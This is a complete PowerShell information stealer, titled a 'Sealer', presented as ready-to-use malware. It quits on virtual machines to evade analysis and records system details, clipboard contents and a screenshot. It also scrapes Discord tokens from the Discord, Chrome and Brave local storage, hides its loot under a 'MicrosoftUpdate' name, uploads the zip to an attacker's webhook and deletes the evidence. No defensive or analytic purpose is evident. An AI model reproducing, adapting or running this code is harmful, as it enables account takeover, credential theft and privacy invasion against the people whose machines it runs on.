# Simple Powershell Sealer - dedconvicss


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhook = "" # Your Webhook
$lootDir = "$env:TEMP\MicrosoftUpdate"
$zipPath = "$env:TEMP\MicrosoftUpdate.zip"
Remove-Item $lootDir -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $lootDir -Force | Out-Null
function Check-VM {
    $vmMarkers = "VBOX", "VMWARE", "XEN", "VIRTUAL", "QEMU", "HYPER"
    $bios = (Get-WmiObject Win32_BIOS).SerialNumber
    $board = (Get-WmiObject Win32_BaseBoard).Product
    foreach ($m in $vmMarkers) {
        if ($bios -like "*$m*" -or $board -like "*$m*") { exit }
    }
}
Check-VM
function Get-SystemInfo {
    $info = @(
        "[+] User: $env:USERNAME",
        "[+] PC: $env:COMPUTERNAME",
        "[+] OS: " + (Get-CimInstance Win32_OperatingSystem).Caption,
        "[+] CPU: " + (Get-CimInstance Win32_Processor).Name,
        "[+] GPU: " + (Get-CimInstance Win32_VideoController | Select-Object -First 1).Name,
        "[+] RAM: " + [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) + " GB"
    )
    $info | Out-File "$lootDir\sysinfo.txt" -Encoding UTF8
}
Get-SystemInfo
try { Get-Clipboard | Out-File "$lootDir\clipboard.txt" -Encoding UTF8 } catch {}
function Take-Screenshot {
    $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object Drawing.Bitmap $b.Width, $b.Height
    $gfx = [Drawing.Graphics]::FromImage($bmp)
    $gfx.CopyFromScreen($b.Location, [Drawing.Point]::Empty, $b.Size)
    $bmp.Save("$lootDir\screenshot.png", [Drawing.Imaging.ImageFormat]::Png)
    $gfx.Dispose()
    $bmp.Dispose()
}
Take-Screenshot
function Grab-Tokens {
    $regex = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
    $outputFile = "$lootDir\discord_tokens.txt"
    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
    Add-Content $outputFile "=== Discord Tokens ===`n"
    $paths = @(
        "$env:APPDATA\Discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
    )
    foreach ($path in $paths) {
        if (Test-Path $path) {
            Get-ChildItem $path -Include *.log,*.ldb -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                $lines = Get-Content $_.FullName -Encoding UTF8 -ErrorAction SilentlyContinue
                foreach ($line in $lines) {
                    $matches = [regex]::Matches($line, $regex)
                    foreach ($m in $matches) {
                        if ($m.Value.Length -eq 59) {
                            Add-Content -Path $outputFile -Value $m.Value
                        }
                    }
                }
            }
        }
    }
}
Grab-Tokens
Add-Type -AssemblyName System.IO.Compression.FileSystem
[IO.Compression.ZipFile]::CreateFromDirectory($lootDir, $zipPath)
function Upload-Zip {
    $boundary = [guid]::NewGuid().ToString()
    $content = [System.IO.File]::ReadAllBytes($zipPath)
    $header = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"Shell Stealer.zip`"`r`nContent-Type: application/zip`r`n`r`n"
    $footer = "`r`n--$boundary--`r`n"
    $body = ([System.Text.Encoding]::ASCII.GetBytes($header)) + $content + ([System.Text.Encoding]::ASCII.GetBytes($footer))
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
    $wc.UploadData($webhook, "POST", $body)
}
Upload-Zip
Grab-Tokens
Take-Screenshot
Upload-Zip
Remove-Item $lootDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue